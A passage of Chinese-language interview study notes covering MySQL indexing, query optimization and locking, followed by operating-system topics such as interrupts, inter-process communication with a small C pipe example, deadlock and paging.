    * Archive是归档的意思，在归档之后很多的高级功能就不再支持了，仅仅支持最基本的插入和查询两种功能。在MySQL 5.5版以前，Archive不支持索引，但是在MySQL 5.5以后的版本就开始支持索引了。
    * Archive拥有很好的压缩机制，它使用zlib压缩库，在记录被请求时会实时压缩，所以它经常被用来当做仓库使用。
  
* **B+树索引**

  * 首先需要注意的是，在MySQL文档里，把B+树索引写成了BTREE（见第九题-缺点-查看索引-图片-Index_type）
  * B+树索引的关键字检索效率比较平均
  * 所有的数据都在叶子节点，且每一个叶子节点都带有指向下一个节点的指针，形成了一个有序的链表。为什么要有序呢？其实是为了范围查询。比如说`select * from Table where id > 1 and id < 100; `当找到1后，只需顺着节点和指针顺序遍历就可以一次性访问到所有数据节点，极大提到了区间查询效率。对于范围查询的话，hash就搞不定了。以下为B+树的优势：
    - 单一节点存储更多元素，减少IO
    - 所有查询都要找到叶子节点，查询稳定
    - 所有叶子节点形成有序链表，方便范围查询
  * 在后面的数据结构中，还需要很多笔墨来写这个数据结构

* **哈希索引**

  哈希索引采用一定的哈希算法，把键值换算成新的哈希值，只需一次哈希算法即可立刻定位到相应的位置，速度非常快，不像B+Tree 索引那样要从根节点逐层访问到叶节点，所以 Hash 索引的查询效率要远高于 B+Tree 索引。

  虽然 Hash 索引效率高，但是 Hash 索引本身由于其特殊性也带来了很多限制和弊端，主要有以下这些。

  * Hash 索引仅能满足"="（等于）和"<=>"(安全等于)这样的等值查询，不能使用范围查询,如果是等值查询，那么哈希索引明显有绝对优势，因为只需要经过一次算法即可找到相应的键值；当然了，这个前提是，键值都是唯一的。如果键值不是唯一的，就需要先找到该键所在位置，然后再根据链表往后扫描，直到找到相应的数据；
  * 由于 Hash 索引比较的是进行 Hash 运算之后的 Hash 值，所以它只能用于等值的过滤，不能用于基于范围的过滤，因为经过相应的 Hash 算法处理之后的 Hash 值的大小关系，并不能保证和Hash运算前完全一样。
  * Hash 索引在任何时候都不能避免表扫描。前面已经知道，Hash 索引是将索引键通过 Hash 运算之后，将 Hash运算结果的 Hash 值和所对应的行指针信息存放于一个 Hash 表中，由于不同索引键可能存在相同 Hash 值，所以即使取满足某个 Hash 键值的数据的记录条数，也无法从 Hash 索引中直接完成查询，还是要通过访问表中的实际数据进行相应的比较，并得到相应的结果。
  * 在有大量重复键值情况下，效率极低的，因为都映射到同一hash值上了。

#### 11、数据库崩溃（可以理解为突然断电什么的）之后怎么办

总体上来说两个措施：强行撤销未完成的事务（UNDO）

重做所有已经提交的事务（REDO） 

#### 12、数据库如何实现查询优化

* 查询优化

  使用索引，尽可能避免全表扫描，首先应考虑在where及order by，group by涉及的列上建立索引。

* 语句优化（举例）

  * 尽量避免在 where 子句中对字段进行 null 值判断，否则将导致引擎放弃使用索引而进行全表扫描，如：`select id from t where num is null`可以在num上设置默认值0，确保表中num列没有null值，然后这样查询：`select id from t where num=0`
  * 尽量避免在 where 子句中使用!=或<>操作符，否则引擎将放弃使用索引而进行全表扫描。
  * 尽量避免在 where 子句中使用or 来连接条件，否则将导致引擎放弃使用索引而进行全表扫描，如：`select id from t where num=10 or num=20`可以这样查询：`select id from t where num=10 union all select id from t where num=20`
  * 下面的查询也将导致全表扫描：`select id from t where name like '%李%'`

  * 尽量指定需要查询的列，不要偷懒使用select *
  * 多条件查询时，请把简单查询条件或则索引列查询置于前面

* 结构优化

  检查数据表结构，改善不完善设计

* 变量优化

  int类型比varchar快，因为整数的比较直接调用底层运算器就可以实现，而字符串比较要逐个字符比较。

* 添加缓存

  使用redis等缓存，还有本地文件缓存等，可以极大地减少数据库查询次数。缓存这个东西，一定要分析自己系统的数据特点，适当选择

#### 13、数据独立性

是指数据库的逻辑独立性和物理独立性

* 逻辑独立性

  外模式不影响概念模式，即用户的应用程序与数据库的逻辑结构是相互独立的，当数据的逻辑结构改变时，用户程序也可以不变（换句话说， 用户视图的改变不影响数据库中的表，数据库中的表改变不影响用户视图）

* 物理独立性

  逻辑模式不影响存储模式，即用户的应用程序与存储在磁盘上的数据库中数据是相互独立的。数据在磁盘上怎样存储由 DBMS 管理，用户程序不需要了解，应用程序要处理的只是数据的逻辑结构，这样当数据的物理存储改变了，应用程序不用改变

####  14、概念

* 主键（Primary Key）：能唯一地标识表中的每一行

* 实体（entity）：客观存在，可以相互区别的事物称为实体。(注意实体是客观上存在的). 
* 实体型（entity type）：用实体名及属性名集合来抽象和刻划的同类实体。比如，学生(学号，姓名) 
* 实体集（entity set）：性质相同的同类实体的集合，称为实体集。比如，(张三，李四) 
* 联系：是指实体之间的相互关系。 
* E-R图：实体型-关系(联系)图。因为E-R图讨论的实体不是具体的个体，而是同类实体的一个集合，即实体集，而实体型恰恰可以表达具有这类性质的集合。E-R图的作用是提供了表示实体型、属性和联系的方法。绘制E-R图的过程是在客观世界与抽象世界之间相互切换，并最终以抽象形式展现的结果。在E-R图中使用实体型来描述实体集(由客观世界实体抽象到抽象世界的实体型)，考查客观中具体实体之间的关系并以联系来表示(由客观世界中实体之间的关系抽象到抽象世界的联系概念)。

#### 15、举例说明一个多对多关系可以分解成多个一对多关系

一个学校，多个年级，多个班，多个学生

年级和学生间属于多对多的关系

一个年级对应多个班（1对多）

一个班对应多个学生（1对多）

分解完毕

#### 16、 mysql的语句从查询到取出经历了什么？（19腾讯面试）

* 连接器：

  我们需要连接上数据库,这时候接待我们的就是<u>连接器</u>

  `mysql -u root -p`

* 查询缓存：

  先到缓存看看是否在此之前执行过这条语句，之前执行的语句可能会以 `key-value` 的形式直接缓存在内存中。`key`是查询语句，`value`是查询结果。如果你的查询能在缓存中找到相应的`key`，则直接返回其对应的`value` 给客户端。

  PS：MySQL 8.0 版本直接将查询缓存的整块功能删掉了，也就是说 8.0 开始彻底没有这个功能了

* 分析器：

  如果没有命中缓存，则需要执行语句。首先MySQL要知道我们要做什么，要先对SQL进行解析。

  分析器首先进行词法分析。我们输入的SQL是由多个字符串组成的，MySQL需要识别出来里边的字符串分别是什么，代表什么意思。

* 优化器：

  经过了分析器，MySQL知道我们要做什么了，在它开始执行之前，还要先经过优化器的处理。

  在表里面有多个索引的时候，决定使用哪个索引；或者在一个语句有多表关联（join）的时候，决定各个表的连接顺序。

* 执行器：

  首先要确认我们是否有操作这个表（T）的权限，如果没有权限则会返回没有权限的错误。

  根据表的引擎定义，去使用这个引擎提供的接口。

  * 如果没有索引，调用引擎的接口一行行取，返回满足条件的结果集
  * 如果有索引，逻辑类似，但索引可以优化我们查询的过程（B+树），不必逐行找，速度更快

#### 17、mysql的缓存设置（19腾讯面试）

* 查看缓存的相关设置

  `show variables like '%cache%';`

```
| query_cache_size               | 16777216             |
| query_cache_type               | OFF                  |
| query_cache_wlock_invalidate   | OFF                  |
```

* 设置缓存大小

  `set global query_cache_size=1024*1024*32;`

#### 18、什么是模式

* 三种模式

  * 外模式（视图层）

    又叫子模式或用户模式

    可以有多个，是用户能看到的 View 

  * 模式（逻辑层）

    又叫逻辑模式/ 概念模式

    只能有一个，是数据库中全体数据的逻辑结构和特征的描述

  * 内模式（物理层）

    又叫存储模式

    只能有一个，是数据库物理结构和存储方法的描述——实际上怎么存储的

* 两种映像

  * 外模式/模式映像

    有任意多个

    保证数据与程序的逻辑独立性

  * 模式/内模式映像

    唯一的

    保证数据与程序的物理独立性

![image-20200308154545312](/Users/godspeed/Library/Application Support/typora-user-images/image-20200308154545312.png)

#### 19、什么是主键？可以为空吗？什么是唯一索引？他们有什么区别？

一个表的 主键 只能有一个，可以包含多个属性，不可为null。

唯一索引可以建多个，且索引列的值必须唯一

#### 20、乐观锁和悲观锁

* 无论是悲观锁还是乐观锁，都是人们定义出来的概念，可以认为是一种思想

* 悲观锁（Pessimistic Lock）

  * 概念：

    当我们要对一个数据库中的一条数据进行修改的时候，为了避免同时被其他人修改，最好的办法就是直接对该数据进行加锁以防止并发。

  * 思想：

    悲观地认为数据被并发修改的概率比较大

  * 缺点：

    会降低并行性，一个事务如果锁定了某行数据，其他事务就必须等待该事务处理完才可以处理那行数据

  * 例子:1号商品的库存为3，我们要将它设置为2

    ```
    //0. 开始事务 
    begin;
    //1. 查询出商品库存信息
    select quantity from items where id=l for update;
    //2. 修改商品库存为 2
    update items set quantity=2 where id =1;
    //3. 提交事务 
    commit;
    ```

    

* 乐观锁（ Optimistic Locking ）

  * 概念：

    乐观锁是相对悲观锁而言的，乐观锁假设数据一般情况下不会造成冲突，所以在数据进行提交更新的时候，才会正式对数据的冲突与否进行检测，如果发现冲突了，则返回给用户错误的信息，让用户决定如何去做。

  * 思想：

    乐观地认为事务之间发生数据竞争的概率比较小

  * 例子：1号商品的库存为3，我们要将它设置为2

    ```
    //查询出商品库存信息，quantity=3 
    select quantity from items where id=l 
    //修改商品库存为 2
    update items set quantity=2 where id=1 and quantity=3
    ```

    他先看一下库存是不是3，然后再修改。

    主要问题就是如果库存经历了3-4-3，或者其他3-2-3的情况（所谓的ABA问题）。

    解决办法是设置递增的version/时间戳，每次在执行数据的修改操作时，都会先查一下版本号记为v，然后修改的时候再看目前的版本号v'是不是正确（v==v'）。

  * 问题：

    一旦遇上高并发的时候，就只有一个线程可以修改成功，那么就会存在大量的失败。

### 四、操作系统

#### 1、中断具体怎么做的（中断过程）?

* 硬中断和软中断

  * 硬中断：

  特点：由外设引发的；可屏蔽；由中断控制器提供

  由与系统相连的外设(比如网卡、硬盘)自动产生的。主要是用来通知操作系统系统外设状态的变化。比如当网卡收到数据包的时候，就会发出一个中断。我们通常所说的中断指的是硬中断。

  * 软中断：

  特点：执行中断指令产生的；不可屏蔽；无需使用中断控制器

  为了满足实时系统的要求，中断处理应该是越快越好。linux为了实现这个特点，当中断发生的时候，硬中断处理那些短时间就可以完成的工作，而将那些处理事件比较长的工作，放到中断之后来完成，也就是软中断来完成

* 中断类型

  * 内中断（异常、例外、陷入Trap）

    源自CPU执行指令内部的事件 ，如程序的非法操作码、地址越界、算术溢出 、 虚存系统的缺页以及专门的陷入指令等引起的事件。 对异常的处理一般要依赖于当前程序的运行现场，而且异常不能被屏蔽， 一旦出现应立即处理。

    * 自愿中断
    * 强迫中断
      * 硬件故障
      * 软件中断

  * 外中断

    CPU 执行指令以外的事件的发生，如设备发出的 I/O 结束中断 ， 表示设备I/O处理己经完成，希望处理机能够向设备发下一个I/O请求， 同时让完成I/O后的程序继续运行 。

    * 外设请求
    * 人的干预

* 中断隐指令
  CPU 响应中断后，经过某些操作，转去执行中断服务程序。这些操作是由硬件直接实现的。它并不是指令系统中的一条真正的指令，没有操作码，是一种不允许、也不可能为用户使用的特殊指令。它所完成的操作如下。

  * 关中断。在中断服务程序中，为了保护中断现场（即 CPU 主要寄存器中的内容）期间不被新的中断所打断，必须关中断，从而保证被中断的程序在中断服务程序执行完毕之后能接着正 确地执行下去。
  * 保存断点 。 为了保证在中断服务程序执行完毕后能正确地返回到原来的程序，必须将原来程序的断点（即程序计数器（PC）的内容）保存起来。
  * 引出中断服务程序。引出中断服务程序的实质就是取出中断服务程序的入口地址并传送 给程序计数器（PC ） 。

* 中断过程（以可嵌套为例）

  1-3由中断隐指令完成，4-9由中断服务程序完成

  * 关中断(中断隐指令)
  * 保存断点(中断隐指令)
  * 引出中断服务程序(中断隐指令)
  * 保存现场和屏蔽字
  * 开中断
  * 执行中断服务程序
  * 关中断
  * 恢复现场和屏蔽字
  * 开中断、中断返回

<u>相关问题</u>

**有哪几种中断，具体说说int 3中断？**



#### 2、磁盘调度算法，I/O 调度能不能采用轮转算法

|         调度算法          |                             思想                             |                             优点                             |                   缺点                   |
| :-----------------------: | :----------------------------------------------------------: | :----------------------------------------------------------: | :--------------------------------------: |
|    先来先服务算法 FCFS    |           按照进程请求访问磁盘的先后顺序进行调度。           |                          简单，公平                          |    未对寻道进行优化，平均寻址时间较长    |
| 最短寻道时间优先算法 SSTF |  选择与当前磁头所在磁道距离最近的请求作为下一次服务的对象。  |         较 FCFS 有较好的寻道性能以及较少的寻道时间。         |              会导致饥饿现象              |
|  扫描(电梯调度)算法 SCAN  | 在磁头当前移动方向上选择与当前磁头所在磁道距离最近的 请求最为下一次服务的对象。 |           具有较好的寻道性能，而且防止了饥饿现象。           | 存在一个请求刚好被错过要等待很久的情形。 |
|    循环扫描算法 CSCAN     | 规定磁头单向移动，如自里向外 移动，当磁头移动到最外的磁道 时立即返回到最里磁道，如此循 环进行扫描。 | 兼顾较好的寻道性能，防止饥饿 现象，同时解决了一个请求等待 时间过长的问题。 |     可能出现磁臂长时间停留在某个位置     |

时间片轮转算法会增加额外的寻道时间，不可采用

#### 3、进程间通信方式和线程间通信方式的区别？

> 了解即可，不作要求

含种类区别和速度区别。

* 进程间的通信方式（8种）

  需要切换内核上下文/需要与外设访问(有名管道，文件)——速度慢

  * 共享内存

    两个进程通过页表将虚拟地址映射到物理地址时，在物理地址中有一块共同的内存区，即共享内存，这块内存可以被两个进程同时看到。这样当一个进程进行“写”，另一个进程“读”，实现进程间通信。但是，我们要确保一个进程在写的时候不能被读，因此我们使用信号量来实现同步与互斥。

    对于一个共享内存，采用引用计数，当进程脱离共享存储区后，计数器减一，挂载成功时，计数器加一，只有当计数器变为零时，才能被删除。当进程终止时，它所附加的共享存储区都会自动脱离。

  * 消息队列

    生产-消费者模型典型代表，一个把数据放到消息队列里，一个从消息队列里取

  * 信号量 

    PV操作

  * 有名管道  

    也被称为“FIFO文件”或“命名管道”，用于不相关进程间的通信，有读端和写端之分。是一种特殊的文件，在文件系统中以文件名的形式存在。

    ```
    process 1   write "xxx"   ===pipe==> read "xxx" process 2
    ```

    在ubuntu中，可以使用`mkfifo god`创建一个名为`god`的有名管道。

    通过`ls -l god`查看

    `prw-r--r-- 1 root root 0 Apr 17 21:35 god`

    我们开启两个终端

    终端1负责定时写:`id=1;while true; do echo $id > god; let id=id+1;sleep 1;done;`

    终端2负责一直读:`while true; do cat god; done;`

    我们会在终端2持续收到递增的值。

  * 无名管道  

    无名管道没有“名字”，不以文件形式存在于文件系统中，无法直接找到，用于“父子进程间的通信”。使用系统调用`int pipe(int fd[2])`来创建无名管道，`fd[2]`中存放的是两个文件描述符，其中`fd[0]`默认负责读，而`fd[1]`负责写端

    ![image-20200417225607874](/Users/godspeed/Library/Application Support/typora-user-images/image-20200417225607874.png)

    test.c

    ```c
    #include <stdio.h>
    #include <string.h>
    #include <stdlib.h>
    #include <unistd.h>
    int main(){
    	int fd[2];
    	pipe(fd);
    	pid_t pid = fork();
    	if(pid==0){//子进程
    		close(fd[1]);//关闭写
    		char buff[128]={0};
    		read(fd[0],buff,127);//读数据
    		printf("Got message: %s\n",buff);
    		close(fd[0]);//读完之后关闭
    	}
    	else{//父进程
    		close(fd[0]);//关闭读
    		char buff[128]="hello, I am your father!";
    		write(fd[1],buff,strlen(buff));//写数据
    		printf("Write message: %s\n",buff);
    		close(fd[1]);//写完之后关闭
    	}
    	return 0;
    }
    ```

    ```
    root@VM-72-56-ubuntu:~# vim test.c
    root@VM-72-56-ubuntu:~# gcc test.c -o foo ; ./foo
    Write message: hello, I am your father!
    root@VM-72-56-ubuntu:~# Got message: hello, I am your father!
    ```

  * 信号（基于进程）

    对指定的进程发送信号:`kill(pid, 信号)`   例如，信号为`SIGKILL`表示杀死某个进程

    不能够传递复杂的、有效的、具体的数据

  * 文件    

    效率比较低

  * socket

    网络之间不同进程间通信

* 线程间的通信方式上述进程间的方式都可沿用，且还有自己独特的几种（除了信号，有13种）

  若线程采用自己特有的通信方式的话，基本都在自己的进程空间内完成，不存在切换

  * 互斥量   
  * 自旋锁   
  * 条件变量 
  * 读写锁   
  * 线程信号
  * 全局变量

#### 4、什么是自旋锁（SpinLock）（19阿里面试）？

> 了解即可

当一个线程在获取锁的时候，如果锁已经被其它线程获取，那么该线程将循环等待，然后不断的判断锁是否能够被成功获取，直到获取到锁才会退出循环。

* 好处：避免上下文切换，这方面来说可以省时
* 坏处：获取锁的线程一直处于活跃状态，但是并没有执行任何有效的任务，使用这种锁会造成busy-waiting。



#### 5、什么是消息队列(Message Queue)？ 

> 了解即可

-  把数据放到消息队列叫做生产者
-  从消息队列里边取数据叫做消费者

MQ是消费-生产者模型的一个典型的代表，一端往消息队列中不断写入消息，而另一端则可以读取队列中的消息。消息发布者只管把消息发布到 MQ 中而不用管谁来取，消息使用者只管从 MQ 中取消息而不管是谁发布的。

以前消费者需要直接向生产者请求数据，但是消费者人员流动变化比较大（生产者需要编写不同的代码向消费者提供数据），为此引入消息队列，生产者把消息丢到消息队列里去，消费者从消息队列里取出数据，实现了生产者和消费者的解耦。

#### 6、线程和进程的区别（高频重点）

* 书上原话：进程是资源分配的基本单位，线程是调度的基本单位。
* 进程的个体间是完全独立的，而线程间是彼此依存的。多进程环境中，任何一个进程的终止，不会影响到其他进程。而多线程环境中，父线程终止，全部子线程被迫终止(没有了资源)。而任何一个子线程终止一般不会影响其他线程，除非子线程执行了exit()系统调用。任何一个子线程执行exit()，全部线程同时灭亡。

* 地址空间:进程内的一个执行单元;进程至少有一个线程;它们共享进程的地址空间;而进程有自己独立的地址空间

* 资源拥有:进程是资源分配和拥有的单位,同一个进程内的线程共享进程的资源线程的创建及上下文切换更加经济

引入线程的原因：

* 线程更加易于调度
* 提高并发性，因为可以创建多个线程去执行同一个进程的不同部分
* 开销少，因为创建进程的话要创建PCB，存放上下文信息，文件信息等等，开销比较大，而创建线程的话开销就会比较少
* 充分发挥多处理器的功能，如果创建出多线程进程，那么可以让线程在不同的处理器上运行，这样不仅可以提高效率，同时也发挥了每个处理器的作用。
  

#### 7、PV 操作的优点

信号量的值除了初值外，仅能由这 PV 原语加以改变。P、V 操作以原语形式实现，保证了对信号量进行操作过程中不会被打断或阻塞。P 操作相当于申请资源，V 操作相当于释放资源。P 操作和 V 操作必定成对出现，但未必在同一个进程中。



#### 8、Cache 与寄存器的区别

* 寄存器（Register）

  是中央处理器内的组成部份。寄存器是有限存贮容量的高速存贮部件， 它们可用来暂存指令、数据和地址

* 高速缓冲存储器（Cache） 

  一种特殊的存储器子系统，其中复制了频繁使用的数据以利于快速访问。存储器的高速缓冲存储器存储了频繁访问的 RAM 位置的内容及这些数据项的存储地址。当处理器引用存储器中的某地址时，高速缓冲存储器便检查是否存有该地址。如果存有该地址，则将数据返回处理器；如果没有保存该地址，则进行常规的存储器访问。因为高速缓冲存储器总是比主  RAM  存储器速度快， 所以当  RAM  的访问速度低于微处理器的速度时，常使用高速缓冲存储器。Cache 的出现是基于两种因素：首先，是由于 CPU 的速度和性能提高很快而主存速度较低且价格高，第二就是程序执行的局部性特点。因此，才将速度比较快而容量有限的  SRAM 构成 Cache，目的在于尽可能发挥 CPU 的高速度。很显然，要尽可能发挥 CPU 的高速度就必须用硬件实现其全部功能。

#### 9、操作系统的层次结构/简述一下操作系统的架构（滴滴） 

> 简单了解

* 硬件层

  包括各种硬件资源。它的对外界面由机器指令系统组成,是操作系统工作的基础。操作系统及其外层软件通过执行机器指令访问和控制各种硬件资源。硬件层以硬件为依托，完成外层的请求和运算以及指令的操作

* 操作系统层

  操作系统是对硬件的首次扩充。它的对外界面是系统调用或者系统服务。实用软件层及应用程序层通过系统调用使用计算机资源。对最终用户,可以通过系统命令利用操作系统的功能

* 实用程序层

  其基础是被操作系统扩充了功能的机器。为应用层软件及最终用户处理自己的程序或者数据提供服务。实用软件是计算机系统的基本组成部分,通常包括各种语言的编译程序,文本编辑程序,调试程序,连接编辑程序,系统维护程序,文本加密程序,终端通信程序。

* 应用层

  包括用户在操作系统和实用软件支持下自己开发的应用程序,以及软件厂家为行业用户开发的专用应用程序包等，是最终用户使用的界面。当然,从最终用户的角度,除了利用应用层的软件之外,也可以利用一些未被隐藏的实用层、操作系统层和硬件层的特性来处理自己的程序和数据。应用层软件可由用户根据自己的需要选购,自主开发或者委托软件厂商定点开发

#### 10、虚拟存储及页置换算法

* 局部性

  * 时间局部性

    如果程序中的某条指令一旦执行，不久以后该指令可能再次执行；如果某数据被访问过，不久以后该数据可能再次被访问。产生时间局部性的典型原因，是由于在程序中存在着大量的循环操作。

  * 空间局部性

     一旦程序访问了某个存储单元，在不久之后，其附近的存储单元也将被访问，即程序在一段时间内所访问的地址，可能集中在一定的范围之内，这是因为指令通常是顺序 存放、顺序执行的，数据也一般是以向量、数组 、表等形式簇聚存储的。

* 虚拟存储（Storage Virtualization）
  根据程序执行的互斥性和局部性两个特点，我们允许作业装入的时候只装入一部分，另一部分放在磁盘上，当需要的时候再装入到主存，这样以来，在一个小的主存空间就可以运行一个比它大的作业。同时，用户编程的时候也摆脱了一定要编写小于主存容量的作业的限制。也就是说，用户的逻辑地址空间可以比主存的绝对地址空间要大。对用户来说，好像计算机系统具有一个容量很大的主存储器，称为“虚拟存储器”。

* 页面置换算法有

  * 最佳置换（Optimal）OPT

    选择最长时间不再被访问的页面，将其淘汰（理想算法，我们无法预测未来）

  * 先进先出页面置换（FIFO）

    优先淘汰最早进入内存的页面

  * 最近最久未使用（LRU）

    选择最近最长时间未访问过的页面予以淘汰

  * 时钟置换算法（CLOCK）

    又称为最近未用（Not Recently Used）NRU算法

* Belady异常

  FIFO 算法可能出现 Belady 异常， 而 LRU 和 OPT 算法永远不会出现 Belady 异常 。
  
* 虚拟存储需要什么特别的要求才能够实现

  好的页面置换算法

  

#### 11、死锁（常见题目）

* 死锁

  各并发进程彼此互相等待对方所拥有的资源，且这些并发进程在得到对方的资源之前不会释放自己所拥有的资源。从而造成大家都想得到资源而又都得不到资源，各并发进程不能继续向前推进的状态。

* 死锁产生的必要条件

  产生死锁必须同时满足以下四个条件，只要其中任一条件不成立，死锁就不会发生。

  * 互斥条件：进程要求对所分配的资源 （如打印机）进行排他性控制，即在一段时间内某资源仅为一个进程所占有。此时若有其他进程请求该资源，则请求进程只能等待。
  * 不剥夺条件：进程所获得的资源在未使用完毕之前，不能被其他进程强行夺走，即只能由获得该资源的进程自己来释放（只能是主动释放）。
  * 请求和保持条件：进程己经保持了至少一个资源，但又提出了新的资源请求，而该资源己被其他进程占有， 此时请求进程被阻塞，但对自己己获得的资源保持不放。
  * 循环等待条件：存在一种进程资源的循环等待链，链中每一个进程己获得的资源同时被链中 下一个进程所请求。

* 死锁预防

  * 破坏四个必要条件之一
  * 一次请求所有资源，资源剥夺，资源按序分配

* 死锁避免

  * 银行家算法

    把操作系统看作是银行家，管的资源相当于银行家的资金，进程向操作系统请求分配资源相当于用户向银行家贷款。操作系统按照银行家制定的规则为进程分配资源， 当进程首次申请资源时，要测试该进程对资源的最大需求量，如果系统现存的资源可以满足它的最大需求量则按当前的申请量分配资源，否则就推迟分配。当进程在执行中继续申请资源时，先测试该进程已占用的资源数与本次申请的资源数之和是否超过了该进程对资源的最大需求量。若超过则拒绝分配资源，若没有超过则再测试系统现存的资源能否满足该进程尚需的最大资源量，若能满足则按当前的申请量分配资源，否则也要推迟分配

  * 寻找可能的安全序列

* 死锁检测

  * 定期检查死锁是否已经发生
  
* 死锁解除（百度面试）

  * 资源剥夺，挂起某些死锁进程，并抢占它的资源，将这些资源分配给其他的死锁进程。但应防止被挂起的进程长时间得不到资源，而处于资源匮乏的状态 。
  * 撤销进程法。强制撤销部分、甚至全部死锁进程并剥夺这些进程的资源。撤销的原则可以按进程优先级和撤销进程代价的高低进行 。
  * 进程回退。让一（或多）个进程回退到足以回避死锁的地步，进程回退时自愿释放资源而不是被剥夺 。 要求系统保持进程的历史信息，设置还原点。

#### 12、windows/linux 使用的文件系统

FAT,FAT32,NTFS,ext2,xet3

#### 13、设备驱动程序作用

* 定义：

  能直接工作在各种硬件设备上的软件，其“驱动”这个名称也十分形象的指明了它的功能——驱使硬件工作。正是通过驱动程序，各种硬件设备才能正常运行，达到既定的工作效果。

* 从理论上讲，所有的硬件设备都需要安装相应的驱动程序才能正常工作。但像CPU、内存、主板、软驱、键盘、显示器等设备却并不需要安装驱动程序也可以正  常工作，而显卡、声卡、网卡等却一定要安装驱动程序，否则便无法正常工作。这主要是由于这些硬件对于一台个人电脑来说是必需的，所以早期的设计人员将这些硬件列为 BIOS 能直接支持的硬件。换句话说，上述硬件安装后就可以被 BIOS 和操作系统直接支持，不再需要安装驱动程序。从这个角度来说，BIOS也是一种驱动程序。但是对于其他的硬件，例如：网卡，声卡，显卡等等却必须要安装驱动程序，不然这些硬件就无法正常工作

#### 14、LINUX 线程与windows线程的区别,以及实现

> 在Linux内核2.4版以前，线程的实现和管理方式就是完全按照进程方式实现的。在2.6版内核以后才有了单独的线程实现。这里就讲2.4以前的。

* Linux并不特殊对待线程，在Linux看来，线程不过就是一种特殊的进程而已。
* Linux 内核并未为线程提供额外调度算法，也没有提供额外的数据结构用于描述和存储线程。
* 就像进程一样，Linux 使用 task_struct 结构体描述和记录线程，每个线程都有唯一属于自己的 task_struct 结构。从这个角度来看，线程就是一个普通的进程，只不过线程可能和其他进程共享一些资源而已。
* Linux 中的进程本身就很轻量级，Linux 创建进程所需时间，并不比 Windows 创建线程所需时间多多少。
* Linux 内核中的线程其实就是进程，因此线程的创建与进程的创建过程是类似的，在调用 clone() 函数时需要传递一个参数用于描述共享资源，`clone(CLONE_VM | CLONE_FS | CLONE_FILES | CLONE_SIGHAND, 0);`上面这行C语言代码和调用 fork() 函数的结果差不多，只不过输入的几个参数标志位说明了子进程与父进程共享一些资源：地址空间、文件系统、打开的文件、信号处理程序。

实现：

Linux 的做法很高雅，它仅需为这 4 个线程创建 4 个 task_struct 结构体，然后在 task_struct 中指定它们共享的资源就可以了。

Windows 一般会有一个包含指向 4 个不同线程的指针的进程描述符，负责描述地址空间、打开的文件等共享资源，而线程本身再去描述自己独占的资源。

#### 15、操作系统中用到了哪些数据结构？

* 链表
  * 进程管理——进程控制块的连接
  * 外存分配方式——链接分配

* 队列
  * 进程通信——消息队列的实现
  * 进程调度——就绪队列的实现
  * 存储器管理——Clock置换算法的实现（循环队列）

* 栈

  存储器管理——LRU(Least Recently used)置换算法

* 树
  
  * 进程管理——进程家族关系描述：进程树
  
* 散列表
  * 内存管理——连续分配方式：Hash算法
  * 文件管理——hash文件

#### 16、慢表是什么？快表是什么？和cache有什么区别？

* 来由

  在虚拟存储器中，必须先访问一次主存去查页表，再访问主存才能取得数据，相当于访存速度降低了一半。

  依据程序执行的局部性原理，在一段时间内总是经常访问某些页，若把这些页对应的页表项存放在高速缓冲器组成的快表 （ TLB）中，则可以明显提高效率。

* 慢表/页表（Page）

  * 位置：

    在主存中

  * 目的：

    为了便于在内存中找到进程的每个页面所对应的物理块，系统为每个进程建立一张页面映射表。

  * 结构：

    页表由页表项组成，页表项有页号和块号组成，根据页表项就可以找到每个页号对于物理内存中物理块的 块号。

* 快表/TLB/旁路缓冲（Translation Lookaside Buffer）

  * 使用相联存储器，根据内容指定地址，是具有并行查询能力的特殊高速缓冲寄存器

  * TLB只是Page的一个副本，而且只存放了慢表中很少的一部分。（TLB 命中则 Page 一定命中）

* 工作过程

  查找时，快表和慢表同时进行。若快表中有此逻辑页号，则能很快地找到对应的物理页号，送入实主存地址寄存器，并使慢表的查找作废，从而就能做到虽采用虚拟存储器但访问主存速度几乎没有下降。

* 在同时具有虚拟页式存储器（有 TLB）和 Cache 的系统中，访问顺序为 TLB→Page→Cache →主存。 CPU发出访存命令（逻辑地址）， 先查找 TLB 和 Page，将逻辑地址转换为物理地址，再查找对应的 Cache 块（与主存查找并行）。若 Cache 命中，则说明所需页面己调入主存， Page 必然命中，但 TLB 不一定命中；若 Cache 不命中，并不能说明所需页面未调入主存，和 TLB 和 Page命中与否没有联系。若 Page 不命中，说明所需页面未调入主存，当然需要执行调页策略。

#### 17、操作系统内存管理

* 操作系统负责内存空间的分配与回收。

  * 单一连续分配

    （有内部碎片）内存中只能有一道用户程序。

  * 固定分区分配

    （有内部碎片）划分成一些分区，每个分区的大小是固定的。

  * 动态分区分配

    （有外部碎片）不会预先划分内存分区，而是在进程装入内存时,根据进程的大小动态地建立分区，并使分区的大小正好适合进程的需要。因此系统分区的大小和数目是可变的。

* 操作系统需要提供某种技术从逻辑上对内存空间进行扩充（虚拟内存）

* 操作系统需要提供地址转换功能，负责程序的逻辑地址与物理地址的转换。

* 操作系统需要提供内存保护功能。保证各进程在各自存储空间内运行，互不干扰

#### 18、一个文件重命名和把它直接删除后再重新建立新文件名有何不同

* 物理地址

  前者不变，后者变化

* 文件控制块FCB

  前者只改了文件名，后者重新建立了一个FCB

#### 19、关于任务管理的问题

> 书上没怎么提到

任务是处理器可以分配调度、执行和挂起的一个工作单元。它可用于执行程序、任务或进程、操作系统服务、中断或异常处理过程和内核代码。

任务切换很像过程调用，但任务切换回保存更多的处理器状态信息。任务切换会把控制权完全转移到一个新的执行环境，即新任务的执行环境。这种转移操作要求保存处理器中几乎所有寄存器的当前内容，包括标志寄存器EFLAG和所有的段寄存器。与过程不同，任务不可重入。任务切换不会把任何信息压入栈中，处理器的状态信息都被保存在内存中称为任务状态段的数据结构中。

#### 20、微内核

* 定义：

  将内核中最基本的功能（如进程管理等）保留在内核，而将那些不需要在核心态执行的功能移到用户态执行， 从而降低了内核的设计复杂性 。 而那些移出内核的操作系统代码根据分层的原则被划分成若干服务程序，它们的执行相互独立，交互则都借助于微内核进行通信 。

* 优势：

  微内核结构有效地分离了内核与服务、服务与服务，使得它们之间的接口更加清晰，维护的 代价大大降低，各部分可以独立地优化和演进，从而保证了操作系统的可靠性 。

* 缺点：

  微内核结构的最大问题是性能问题，因为需要频繁地在核心态和用户态之间进行切换，操作系统的执行开销偏大。因此有的操作系统将那些频繁使用的系统服务又移回内核，从而保证系统性能。

#### 21、简述一下分页机制（360面试）

 ①页式存储

把主存空间划分为大小相 等且固定的块，块相对较小，作为主存的基本单位。每个进程也以块为单位进行划分，进程在执 行时，以块为单位逐个申请主存中的块空间。 

②段式存储 

